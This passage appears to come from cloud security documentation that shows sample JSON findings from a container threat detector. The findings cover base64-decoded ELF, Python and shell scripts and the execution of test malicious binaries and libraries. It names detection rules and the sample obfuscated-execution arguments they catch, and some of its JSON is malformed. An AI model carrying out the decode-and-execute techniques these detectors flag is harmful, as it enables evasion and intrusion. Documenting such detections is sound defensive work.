          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "logEntries": [
          {
            "cloudLoggingEntry": {
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": "2025-01-21T19:55:19.654640277Z"
            }
          }
        ],
        "mitreAttack": {},
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "mitreAttack": {
          "primaryTactic": "DEFENSE_EVASION",
          "primaryTechniques": [
            "OBFUSCATED_FILES_OR_INFO",
            "DEOBFUSCATE_DECODE_FILES_OR_INFO"
          ],
          "additionalTactics": [
            "EXECUTION"
          ],
          "additionalTechniques": [
            "COMMAND_AND_SCRIPTING_INTERPRETER",
            "UNIX_SHELL"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "\"/usr/bin/base64\"",
              "size": "39096",
              "sha256": "a51595201def5bde3c47d68c8e8dda31f4e424293f2a5eefb00e47f2db0c2d84",
              "hashedSize": "39096",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "args": [
              "\"base64\"",
              "\"-d\"",
              "\"f0VMRgIB\""
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"HOSTNAME\"",
                "val": "\"CONTAINER_NAME\""
              },
            ],
            "pid": "9",
            "parentPid": "1"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "MEDIUM",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "folders": [
            {
              "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/FOLDER_NUMBER",
              "resourceFolderDisplayName": "FOLDER_ID"
            }
          ],
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_FOLDER",
              "id": "folders/FOLDER_NUMBER",
              "displayName": "FOLDER_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "ktd_base64_elf_file_cmdline"
        },
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1729291973",
                "nanos": 687426149
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/tactics/TA0005/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal File Link",
              "url": "https://www.virustotal.com/gui/file/a51595201def5bde3c47d68c8e8dda31f4e424293f2a5eefb00e47f2db0c2d84/detection"
            }
          ],
          "relatedFindingUri": {}
        }
      },
    }
        

#### Defense Evasion: Base64 Encoded Python Script Executed
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Defense Evasion: Base64 Encoded Python Script Executed",
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "2024-06-17T18:50:13Z"
          }
        ],
        "createTime": "2025-01-21T19:55:22.017Z",
        "database": {},
        "eventTime": "2025-01-21T19:55:21.762Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "2025-01-21T19:55:19Z"
                }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "logEntries": [
          {
            "cloudLoggingEntry": {
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": "2025-01-21T19:55:19.654640277Z"
            }
          }
        ],
        "mitreAttack": {},
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "mitreAttack": {
          "primaryTactic": "DEFENSE_EVASION",
          "primaryTechniques": [
            "OBFUSCATED_FILES_OR_INFO",
          ],
          "additionalTactics": [
            "EXECUTION"
          ],
          "additionalTechniques": [
            "DEOBFUSCATE_DECODE_FILES_OR_INFO"
            "COMMAND_AND_SCRIPTING_INTERPRETER",
            "UNIX_SHELL"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "\"/usr/bin/base64\"",
              "size": "39096",
              "sha256": "a51595201def5bde3c47d68c8e8dda31f4e424293f2a5eefb00e47f2db0c2d84",
              "hashedSize": "39096",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "args": [
              "\"base64\"",
              "\"-d\"",
              "\"cHl0aG9uIC1j\""
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"HOSTNAME\"",
                "val": "\"CONTAINER_NAME\""
              },
            ],
            "pid": "9",
            "parentPid": "1"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "MEDIUM",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "folders": [
            {
              "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/FOLDER_NUMBER",
              "resourceFolderDisplayName": "FOLDER_ID"
            }
          ],
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_FOLDER",
              "id": "folders/FOLDER_NUMBER",
              "displayName": "FOLDER_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "ktd_base64_encoded_python_script_executed"
        },
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1729291973",
                "nanos": 687426149
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/tactics/TA0005/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal File Link",
              "url": "https://www.virustotal.com/gui/file/a51595201def5bde3c47d68c8e8dda31f4e424293f2a5eefb00e47f2db0c2d84/detection"
            }
          ],
          "relatedFindingUri": {}
        }
      },
    }
        

#### Defense Evasion: Base64 Encoded Shell Script Executed
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Defense Evasion: Base64 Encoded Shell Script Executed",
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "2024-06-17T18:50:13Z"
          }
        ],
        "createTime": "2025-01-21T19:55:22.017Z",
        "database": {},
        "eventTime": "2025-01-21T19:55:21.762Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "2025-01-21T19:55:19Z"
                }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "logEntries": [
          {
            "cloudLoggingEntry": {
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": "2025-01-21T19:55:19.654640277Z"
            }
          }
        ],
        "mitreAttack": {},
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "mitreAttack": {
          "primaryTactic": "DEFENSE_EVASION",
          "primaryTechniques": [
            "DATA_ENCODING",
            "STANDARD_ENCODING"
          ],
          "additionalTactics": [
            "COMMAND_AND_CONTROL",
            "EXECUTION"
          ],
          "additionalTechniques": [
            "COMMAND_AND_SCRIPTING_INTERPRETER",
            "UNIX_SHELL",
            "OBFUSCATED_FILES_OR_INFO",
            "DEOBFUSCATE_DECODE_FILES_OR_INFO"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "\"/usr/bin/base64\"",
              "size": "39096",
              "sha256": "a51595201def5bde3c47d68c8e8dda31f4e424293f2a5eefb00e47f2db0c2d84",
              "hashedSize": "39096",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "args": [
              "\"base64\"",
              "\"-d\"",
              "\"IyEvYmluL2Jhc2gK\""
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"HOSTNAME\"",
                "val": "\"CONTAINER_NAME\""
              },
            ],
            "pid": "9",
            "parentPid": "1"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "MEDIUM",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "folders": [
            {
              "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/FOLDER_NUMBER",
              "resourceFolderDisplayName": "FOLDER_ID"
            }
          ],
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_FOLDER",
              "id": "folders/FOLDER_NUMBER",
              "displayName": "FOLDER_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "ktd_base64_encoded_shell_script_executed"
        },
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1729291973",
                "nanos": 687426149
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/tactics/TA0005/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal File Link",
              "url": "https://www.virustotal.com/gui/file/a51595201def5bde3c47d68c8e8dda31f4e424293f2a5eefb00e47f2db0c2d84/detection"
            }
          ],
          "relatedFindingUri": {}
        }
      },
    }
        

#### Execution: Added Malicious Binary Executed
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID"
        "category": "Execution: Added Malicious Binary Executed",
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_URI",
            "imageId": "CONTAINER_IMAGE_ID"
          }
        ],
        "createTime": "2023-11-13T19:51:22.538Z",
        "database": {},
        "eventTime": "2023-11-13T19:51:22.383Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "default",
              "containers": [
                    {
                      "name": "CONTAINER_NAME",
                      "uri": "CONTAINER_URI",
                      "imageId": CONTAINER_IMAGE_ID"
                    }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE"
            }
          ]
        },
        "mitreAttack": {
          "primaryTactic": "EXECUTION",
          "primaryTechniques": [
            "NATIVE_API"
          ]
        },
        "mute": "UNDEFINED",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "\"/tmp/malicious-binary-dd922bc4ee3b49fd-should-trigger\"",
              "size": "68",
              "sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
              "hashedSize": "68",
              "partiallyHashed": false
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false
            },
            "args": [
              "\"/tmp/malicious-binary-dd922bc4ee3b49fd-should-trigger\""
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"KUBERNETES_SERVICE_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT\"",
                "val": "\"tcp://10.68.2.129:443\""
              },
              {
                "name": "\"HOSTNAME\"",
                "val": "\"ktd-test-added-test-malicious-binary\""
              },
              {
                "name": "\"HOME\"",
                "val": "\"/root\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_ADDR\"",
                "val": "\"10.68.2.129\""
              },
              {
                "name": "\"PATH\"",
                "val": "\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PROTO\"",
                "val": "\"tcp\""
              },
              {
                "name": "\"DEBIAN_FRONTEND\"",
                "val": "\"noninteractive\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT_HTTPS\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP\"",
                "val": "\"tcp://10.68.2.129:443\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_HOST\"",
                "val": "\"10.68.2.129\""
              },
              {
                "name": "\"PWD\"",
                "val": "\"/malicious_files\""
              }
            ],
            "pid": "7",
            "parentPid": "1"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/CLUSTER_ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "CRITICAL",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/CLUSTER_ZONE/clusters/CLUSTER_ID",
        "display_name": "CLUSTER_ID",
        "project_name": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER",
        "project_display_name": "PROJECT_ID",
        "parent_name": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER",
        "parent_display_name": "PROJECT_ID",
        "type": "google.container.Cluster",
        "folders": []
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "added_malicious_binary_executed"
        },
        "detectionPriority": "CRITICAL",
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1699905066",
                "nanos": 618571329
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/techniques/T1106/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal IP Link",
              "url": "https://www.virustotal.com/gui/file/275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f/detection"
            }
          ],
          "cloudLoggingQueryUri": [
            {
              "displayName": "Cloud Logging Query Link",
              "url": "https://console.cloud.google.com/logs/query;query=timestamp%3D%222023-11-13T19:51:06.618571329Z%22%0AinsertId%3D%22%22?project=PROJECT_NUMBER"
            }
          ],
          "relatedFindingUri": {}
        }
      }
    }
      

#### Execution: Added Malicious Library Loaded
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID"
        "category": "Execution: Added Malicious Library Loaded",
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_URI",
            "imageId": "CONTAINER_IMAGE_ID"
          }
        ],
        "createTime": "2023-11-13T21:40:14.340Z",
        "database": {},
        "eventTime": "2023-11-13T21:40:14.209Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "default",
              "containers": [
                    {
                      "name": "CONTAINER_NAME",
                      "uri": "CONTAINER_URI",
                      "imageId": CONTAINER_IMAGE_ID"
                    }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE"
            }
          ]
        },
        "mitreAttack": {
          "primaryTactic": "EXECUTION",
          "primaryTechniques": [
            "SHARED_MODULES"
          ]
        },
        "mute": "UNDEFINED",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "\"/malicious_files/drop_mal_lib\"",
              "size": "5005064",
              "sha256": "fe2e70de9f77047d3bf5debe3135811300c9c69b937b7fd3e2ca8451a942d5fb",
              "hashedSize": "5005064",
              "partiallyHashed": false
            },
            "libraries": [
              {
                "path": "\"/tmp/added-malicious-library-299fd066380ce690-should-trigger\"",
                "size": "68",
                "sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
                "hashedSize": "68",
                "partiallyHashed": false
              }
            ],
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false
            },
            "args": [
              "\"/malicious_files/drop_mal_lib\"",
              "\"/tmp/added-malicious-library-299fd066380ce690-should-trigger\""
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"KUBERNETES_SERVICE_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT\"",
                "val": "\"tcp://10.108.174.129:443\""
              },
              {
                "name": "\"HOSTNAME\"",
                "val": "\"ktd-test-added-malicious-library\""
              },
              {
                "name": "\"HOME\"",
                "val": "\"/root\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_ADDR\"",
                "val": "\"10.108.174.129\""
              },
              {
                "name": "\"PATH\"",
                "val": "\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PROTO\"",
                "val": "\"tcp\""
              },
              {
                "name": "\"DEBIAN_FRONTEND\"",
                "val": "\"noninteractive\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT_HTTPS\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP\"",
                "val": "\"tcp://10.108.174.129:443\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_HOST\"",
                "val": "\"10.108.174.129\""
              },
              {
                "name": "\"PWD\"",
                "val": "\"/malicious_files\""
              }
            ],
            "pid": "8",
            "parentPid": "1"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/CLUSTER_ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "CRITICAL",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/CLUSTER_ZONE/clusters/CLUSTER_ID",
        "display_name": "CLUSTER_ID",
        "project_name": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER",
        "project_display_name": "PROJECT_ID",
        "parent_name": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER",
        "parent_display_name": "PROJECT_ID",
        "type": "google.container.Cluster",
        "folders": []
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "added_malicious_library_loaded"
        },
        "detectionPriority": "CRITICAL",
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1699911603",
                "nanos": 535268047
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/techniques/T1129/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal IP Link",
              "url": "https://www.virustotal.com/gui/file/275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f/detection"
            }
          ],
          "cloudLoggingQueryUri": [
            {
              "displayName": "Cloud Logging Query Link",
              "url": "https://console.cloud.google.com/logs/query;query=timestamp%3D%222023-11-13T21:40:03.535268047Z%22%0AinsertId%3D%22%22?project=PROJECT_NUMBER"
            }
          ],
          "relatedFindingUri": {}
        }
      }
    }
      

#### Execution: Built in Malicious Binary Executed
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID"
        "category": "Execution: Built in Malicious Binary Executed",
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_URI",
            "imageId": "CONTAINER_IMAGE_ID"
          }
        ],
        "createTime": "2023-11-13T21:38:57.405Z",
        "database": {},
        "eventTime": "2023-11-13T21:38:57.250Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "default",
              "containers": [
                    {
                      "name": "CONTAINER_NAME",
                      "uri": "CONTAINER_URI",
                      "imageId": CONTAINER_IMAGE_ID"
                    }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE"
            }
          ]
        },
        "mitreAttack": {
          "primaryTactic": "EXECUTION",
          "primaryTechniques": [
            "NATIVE_API"
          ]
        },
        "mute": "UNDEFINED",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "\"/malicious_files/eicar_testing_file\"",
              "size": "68",
              "sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
              "hashedSize": "68",
              "partiallyHashed": false
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false
            },
            "args": [
              "\"/malicious_files/eicar_testing_file\"",
              "\"built-in-malicious-binary-818358caa95b6d42\""
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"KUBERNETES_SERVICE_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT\"",
                "val": "\"tcp://10.77.124.129:443\""
              },
              {
                "name": "\"HOSTNAME\"",
                "val": "\"ktd-test-built-in-malicious-binary\""
              },
              {
                "name": "\"HOME\"",
                "val": "\"/root\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_ADDR\"",
                "val": "\"10.77.124.129\""
              },
              {
                "name": "\"PATH\"",
                "val": "\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PROTO\"",
                "val": "\"tcp\""
              },
              {
